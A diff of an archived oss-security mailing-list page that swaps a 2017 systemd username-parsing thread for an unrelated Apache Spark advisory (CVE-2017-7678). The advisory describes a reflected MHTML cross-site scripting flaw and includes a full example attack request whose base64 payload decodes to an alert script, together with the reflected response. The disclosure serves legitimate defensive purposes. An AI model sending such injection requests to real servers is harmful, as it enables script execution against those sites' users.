@@ -1,99 +1,53 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/07/05/17
-Message-ID: <1499269723.28229.2.camel@gmail.com>
-Date: Wed, 05 Jul 2017 11:48:43 -0400
-From: Daniel Micay <danielmicay@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/07/12/2
+Message-ID: <CAEccTywUwRDdXZBHeUnuF6Sg+-U1Zd+MMqz_F9QDNRPts9O46Q@mail.gmail.com>
+Date: Wed, 12 Jul 2017 10:31:17 +0000
+From: Sean Owen <srowen@...che.org>
 To: oss-security@...ts.openwall.com
-Subject: Re: systemd fails to parse user that should run service
+Subject: CVE-2017-7678 Apache Spark XSS web UI MHTML vulnerability
 Content-Type: text/plain; charset=utf-8
 
-On Wed, 2017-07-05 at 16:37 +0100, John Haxby wrote:
-> On 05/07/17 16:06, Daniel Micay wrote:
-> > On Wed, 2017-07-05 at 15:50 +0100, John Haxby wrote:
-> > > On 05/07/17 14:53, Simon McVittie wrote:
-> > > > On Wed, 05 Jul 2017 at 14:02:23 +0200, Casper.Dik@...cle.com
-> > > > wrote:
-> > > > > > 2) If user name specified in systemd unit file is
-> > > > > > syntactically
-> > > > > > correct
-> > > > > > (according to systemd check) but user name does not exist
-> > > > > > then
-> > > > > > systemd
-> > > > > > refuse to start that unit.
-> > > > > 
-> > > > > Should systemd really valid usernames?  I would think that you
-> > > > > would 
-> > > > > either use getpwnam(username) and if that fails you may then
-> > > > > parse
-> > > > > it as a 
-> > > > > numeric value.  If "0day" isn't a valid username according to
-> > > > > getpwnam(), 
-> > > > > when converting it to a numeric uid should *also* fail because
-> > > > > "0day" 
-> > > > > isn't a properly numeric value.
-> > > > 
-> > > > It *does* fail. The problem is in the handling of that failure.
-> > > > systemd
-> > > > interprets that failure as "this line is nonsense, so behave as
-> > > > though the
-> > > > line didn't exist" rather than "this line can be positively
-> > > > identified as
-> > > > an attempt to name a nonexistent or unacceptable user, so fail
-> > > > to
-> > > > load
-> > > > the unit". So User=7up does the same thing as User=0day - it
-> > > > doesn't
-> > > > run as uid 7, which is 'lp' on my Debian system.
-> > > 
-> > > 
-> > > And therein lies the problem.  "0day" and "7up" are valid user
-> > > names
-> > > according to Posix[1], they may or may not exist, but they are
-> > > valid.
-> > > You may think Posix is wrong to allow an initial digit, but that
-> > > isn't
-> > > the issue.  The problem is that systemd treats an "invalid"
-> > > username
-> > > as
-> > > either an integer or not specified and in either case this results
-> > > in
-> > > a
-> > > program running as the wrong user, probably as root.
-> > > 
-> > > Having systemd balk at what Posix considers to be a valid username
-> > > is
-> > > a
-> > > bug that systemd is free to say "this is stupid, we're not
-> > > allowing
-> > > that".   If, as appears to be the case, systemd says "that
-> > > username is
-> > > stupid, we're going to interpret it differently" then that's when
-> > > we
-> > > need a CVE because, to my mind on this hot and sunny say, that's
-> > > systemd
-> > > apparently doing something for security that it is not.
-> > > 
-> > > jch
-> > > 
-> > > 
-> > > [1]
-> > > http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap03
-> > > .htm
-> > > l#tag_03_431
-> > 
-> > https://github.com/shadow-maint/shadow/blob/master/libmisc/chkname.c
-> > #L49
-> > 
-> > POSIX also says "." is a portable character, which isn't allowed by
-> > shadow either. What are distributions using to provide useradd if
-> > not
-> > shadow?
-> 
-> Interesting.  "useradd a.b" works on Fedora so I wonder what's
-> different
-> there?
+Severity: Low
 
-It seems some distributions get useradd/userdel from somewhere else.
+Vendor: The Apache Software Foundation
 
-Maybe you have adduser from shadow? It'd be funny if they had different
-rules enforced even for adduser vs. useradd...
+Versions Affected:
+Versions of Apache Spark before 2.2.0
+
+Description:
+It is possible for an attacker to take advantage of a user's trust in the
+server to trick them into visiting a link that points to a shared Spark
+cluster and submits data including MHTML to the Spark master, or history
+server. This data, which could contain a script, would then be reflected
+back to the user and could be evaluated and executed by MS Windows-based
+clients. It is not an attack on Spark itself, but on the user, who may then
+execute the script inadvertently when viewing elements of the Spark web UIs.
+
+Mitigation:
+Update to Apache Spark 2.2.0 or later.
+
+Example:
+Request:
+GET
+/app/?appId=Content-Type:%20multipart/related;%20boundary=_AppScan%0d%0a--
+_AppScan%0d%0aContent-Location:foo%0d%0aContent-Transfer-
+Encoding:base64%0d%0a%0d%0aPGh0bWw%2bPHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD48L2h0bWw%2b%0d%0a
+HTTP/1.1
+
+Excerpt from response:
+<div class="row-fluid">No running application with ID Content-Type:
+multipart/related;
+boundary=_AppScan
+--_AppScan
+Content-Location:foo
+Content-Transfer-Encoding:base64
+PGh0bWw+PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD48L2h0bWw+
+</div>
+
+Result: In the above payload the BASE64 data decodes as:
+<html><script>alert("XSS")</script></html>
+
+Credit:
+Mike Kasper, Nicholas Marion
+IBM z Systems Center for Secure Engineering
+
